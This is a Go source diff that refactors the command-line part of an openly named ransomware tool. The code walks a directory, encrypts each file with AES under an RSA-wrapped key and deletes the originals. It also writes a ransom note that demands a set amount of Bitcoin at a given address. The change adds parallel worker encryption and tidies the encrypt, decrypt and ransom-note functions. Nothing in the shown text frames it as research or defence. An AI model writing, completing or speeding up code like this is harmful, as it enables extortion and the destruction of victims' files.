@@ -1,12 +1,10 @@
 package cli
 
 import (
-	"bufio"
 	"crypto/rsa"
 	"encoding/base64"
 	"errors"
 	"fmt"
-	iofs "io/fs"
 	"log"
 	"os"
 	"path/filepath"
@@ -20,90 +18,63 @@ import (
 
 type Ransom struct {
 	BitcoinAddress string
-	BitcoinCount   float32
+	BitcoinCount   float64
 	PublicKey      string
 }
 
-func LoadPublicKey(path string) (*rsa.PublicKey, error) {
-	rsaPublicString, err := fs.ReadStringFileContent(path)
-
+func loadPublicKey(path string) (*rsa.PublicKey, error) {
+	pem, err := fs.ReadStringFileContent(path)
 	if err != nil {
 		return nil, err
 	}
-
-	rsaPublic, err := crypto.ParseRsaPublicKeyFromPemStr(rsaPublicString)
-
-	if err != nil {
-		return nil, err
-	}
-
-	return rsaPublic, nil
+	return crypto.ParseRsaPublicKeyFromPemStr(pem)
 }
 
-func LoadPrivateKey(path string) (*rsa.PrivateKey, error) {
-	rsaPrivateString, err := fs.ReadStringFileContent(path)
-
+func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
+	pem, err := fs.ReadStringFileContent(path)
 	if err != nil {
 		return nil, err
 	}
-
-	rsaPrivate, err := crypto.ParseRsaPrivateKeyFromPemStr(rsaPrivateString)
-
-	if err != nil {
-		return nil, err
-	}
-
-	return rsaPrivate, nil
+	return crypto.ParseRsaPrivateKeyFromPemStr(pem)
 }
 
 func Encrypt(ctx *urfavecli.Context) error {
 	path := ctx.String("path")
-
-	if path == "" {
-		return errors.New("path argument is required")
-	}
-
 	publicKeyPath := ctx.String("publicKey")
-
-	if publicKeyPath == "" {
-		return errors.New("publicKey argument is required")
-	}
-
-	publicKey, err := LoadPublicKey(publicKeyPath)
-
-	if err != nil {
-		return err
-	}
-
-	log.Println("RSA public key loaded")
-
-	log.Println("Generating new AES key for current session")
-	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
-
-	if err != nil {
-		return err
-	}
-
-	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)
-
-	if err != nil {
-		return err
-	}
-
 	addRansom := ctx.Bool("addRansom")
 	ransomTemplatePath := ctx.String("ransomTemplatePath")
 	ransomFileName := ctx.String("ransomFileName")
 	bitcoinCount := ctx.Float64("bitcoinCount")
 	bitcoinAddress := ctx.String("bitcoinAddress")
-
 	skipHidden := ctx.Bool("skipHidden")
 	dryRun := ctx.Bool("dryRun")
+	workers := ctx.Int("workers")
 	extBlacklist := splitCommaSeparated(ctx.String("extBlacklist"))
 	extWhitelist := splitCommaSeparated(ctx.String("extWhitelist"))
 	encSuffix := ctx.String("encSuffix")
 
-	absolutePath, err := filepath.Abs(path)
+	if addRansom && ransomTemplatePath == "" {
+		return errors.New("ransomTemplatePath is required when addRansom is enabled")
+	}
 
+	absolutePath, err := filepath.Abs(path)
+	if err != nil {
+		return err
+	}
+
+	publicKey, err := loadPublicKey(publicKeyPath)
+	if err != nil {
+		return err
+	}
+	log.Println("RSA public key loaded")
+
+	log.Println("Generating new AES key for current session")
+	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
+	if err != nil {
+		return err
+	}
+
+	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)
 	if err != nil {
 		return err
 	}
@@ -113,6 +84,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	log.Printf("Whitelisted extensions = %v", extWhitelist)
 	log.Printf("Skipping hidden files/folders = %t", skipHidden)
 	log.Printf("DryRun enabled = %t", dryRun)
+	log.Printf("Workers = %d", workers)
 	log.Printf("EncSuffix = %s", encSuffix)
 	log.Printf("Encrypted key size = %d", len(encryptedAesKey))
 	log.Printf("Encrypted key = %s", base64.StdEncoding.EncodeToString(encryptedAesKey))
@@ -121,172 +93,135 @@ func Encrypt(ctx *urfavecli.Context) error {
 	log.Printf("Ransom file template = %s", ransomTemplatePath)
 	log.Printf("Ransom file name = %s", ransomFileName)
 
-	err = fs.WalkFilesWithExtFilter(absolutePath, extBlacklist, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
-		err := encryptFile(path, plainAesKey, encryptedAesKey, encSuffix)
-
-		if err != nil {
-			return err
-		}
-
-		if !dryRun {
-			err := fs.DeleteFileIfExists(path)
-
-			if err != nil {
-				return err
-			}
-		}
-
-		return nil
-	})
-
-	if addRansom {
-		ransomPath := filepath.Join(absolutePath, ransomFileName)
-
-		log.Printf("Adding ransom file at %s", ransomPath)
-
-		if _, err := os.Stat(ransomPath); errors.Is(err, os.ErrNotExist) {
-			// Ransom file does not exist
-
-			if ransomTemplatePath == "" {
-				return errors.New("if you want to add a ransom you must provide a templatePath")
-			}
-
-			templateAbsPath, err := filepath.Abs(ransomTemplatePath)
-
-			if err != nil {
-				return err
-			}
-
-			template, err := template.ParseFiles(templateAbsPath)
-
-			if err != nil {
-				return err
-			}
-
-			textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
-
-			if err != nil {
-				return err
-			}
-
-			file, err := os.Create(ransomPath)
-
-			if err != nil {
-				return err
-			}
-
-			defer file.Close()
-
-			writer := bufio.NewWriter(file)
-
-			err = template.Execute(writer, &Ransom{
-				BitcoinCount:   float32(bitcoinCount),
-				BitcoinAddress: bitcoinAddress,
-				PublicKey:      textPublicKey,
-			})
-
-			if err != nil {
-				return err
-			}
-
-			if err := writer.Flush(); err != nil {
-				return err
-			}
-		} else {
-			log.Printf("Ransom file already exists at %s. Skipping generation", ransomPath)
-		}
+	files, err := fs.WalkAndCollect(absolutePath, extBlacklist, extWhitelist, skipHidden)
+	if err != nil {
+		return err
 	}
 
-	return err
+	if err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
+		if err := encryptFile(filePath, plainAesKey, encryptedAesKey, encSuffix); err != nil {
+			return err
+		}
+		if !dryRun {
+			return fs.DeleteFileIfExists(filePath)
+		}
+		return nil
+	}); err != nil {
+		return err
+	}
+
+	if addRansom {
+		return writeRansomNote(absolutePath, ransomFileName, ransomTemplatePath, publicKey, bitcoinAddress, bitcoinCount)
+	}
+
+	return nil
 }
 
 func Decrypt(ctx *urfavecli.Context) error {
 	path := ctx.String("path")
-
-	if path == "" {
-		return errors.New("path argument is required")
-	}
-
 	privateKeyPath := ctx.String("privateKey")
-
-	if privateKeyPath == "" {
-		return errors.New("privateKey argument is required")
-	}
-
-	rsaPrivateKey, err := LoadPrivateKey(privateKeyPath)
-
-	if err != nil {
-		return err
-	}
-
-	log.Println("RSA private key loaded")
-
 	dryRun := ctx.Bool("dryRun")
 	skipHidden := ctx.Bool("skipHidden")
+	workers := ctx.Int("workers")
 	encSuffix := ctx.String("encSuffix")
 	ransomFileName := ctx.String("ransomFileName")
 	extWhitelist := []string{encSuffix}
 
-	log.Printf("EncSuffix = %s", encSuffix)
-	log.Printf("DryRun enabled = %t", dryRun)
-	log.Printf("Whitelisted extensions = %v", extWhitelist)
-	log.Printf("Ransom file name = %s", ransomFileName)
-	log.Printf("Skip Hidden = %t", skipHidden)
-
 	absolutePath, err := filepath.Abs(path)
-
 	if err != nil {
 		return err
 	}
+
+	rsaPrivateKey, err := loadPrivateKey(privateKeyPath)
+	if err != nil {
+		return err
+	}
+	log.Println("RSA private key loaded")
 
 	log.Printf("Running ransomware tool on %s", absolutePath)
+	log.Printf("EncSuffix = %s", encSuffix)
+	log.Printf("DryRun enabled = %t", dryRun)
+	log.Printf("Workers = %d", workers)
+	log.Printf("Whitelisted extensions = %v", extWhitelist)
+	log.Printf("Ransom file name = %s", ransomFileName)
+	log.Printf("Skipping hidden files/folders = %t", skipHidden)
 
-	err = fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
-		err := decryptFile(path, rsaPrivateKey, encSuffix)
-
-		if err != nil {
-			return err
-		}
-
-		if !dryRun {
-			err := fs.DeleteFileIfExists(path)
-
-			if err != nil {
-				return err
-			}
-		}
-
-		return nil
-	})
-
+	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden)
 	if err != nil {
 		return err
 	}
 
-	// Delete root ransom file (if any)
+	if err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
+		if err := decryptFile(filePath, rsaPrivateKey, encSuffix); err != nil {
+			return err
+		}
+		if !dryRun {
+			return fs.DeleteFileIfExists(filePath)
+		}
+		return nil
+	}); err != nil {
+		return err
+	}
+
 	return fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
+}
+
+func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) error {
+	ransomPath := filepath.Join(dir, fileName)
+	log.Printf("Adding ransom file at %s", ransomPath)
+
+	if _, err := os.Stat(ransomPath); err == nil {
+		log.Printf("Ransom file already exists at %s. Skipping generation", ransomPath)
+		return nil
+	} else if !errors.Is(err, os.ErrNotExist) {
+		return err
+	}
+
+	templateAbsPath, err := filepath.Abs(templatePath)
+	if err != nil {
+		return err
+	}
+
+	tmpl, err := template.ParseFiles(templateAbsPath)
+	if err != nil {
+		return err
+	}
+
+	textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
+	if err != nil {
+		return err
+	}
+
+	file, err := os.Create(ransomPath)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	return tmpl.Execute(file, &Ransom{
+		BitcoinCount:   bitcoinCount,
+		BitcoinAddress: bitcoinAddress,
+		PublicKey:      textPublicKey,
+	})
 }
 
 func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
 	log.Printf("Encrypting %s", path)
 
-	newFilePath := fmt.Sprintf("%s%s", path, encSuffix)
-
 	plainText, err := os.ReadFile(path)
-
 	if err != nil {
 		return err
 	}
 
 	cipherText, err := crypto.AesEncrypt(plainText, aesKey)
-
 	if err != nil {
 		return err
 	}
 
-	fileContent := append(encryptedAesKey, cipherText...)
-
-	return fs.WriteToFile(newFilePath, fileContent)
+	fileContent := make([]byte, 0, len(encryptedAesKey)+len(cipherText))
+	fileContent = append(fileContent, encryptedAesKey...)
+	fileContent = append(fileContent, cipherText...)
+	return fs.WriteToFile(path+encSuffix, fileContent)
 }
 
 func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
@@ -302,21 +237,17 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) e
 		return fmt.Errorf("file too small to be a valid encrypted file: %s", path)
 	}
 
-	newFilePath := strings.TrimSuffix(path, encSuffix)
-
 	aesKey, err := crypto.RsaDecrypt(cipherText[:keySize], rsaPrivateKey)
-
 	if err != nil {
 		return err
 	}
 
 	plaintext, err := crypto.AesDecrypt(cipherText[keySize:], aesKey)
-
 	if err != nil {
 		return err
 	}
 
-	return fs.WriteToFile(newFilePath, plaintext)
+	return fs.WriteToFile(strings.TrimSuffix(path, encSuffix), plaintext)
 }
 
 // splitCommaSeparated splits a comma-separated string into a slice.
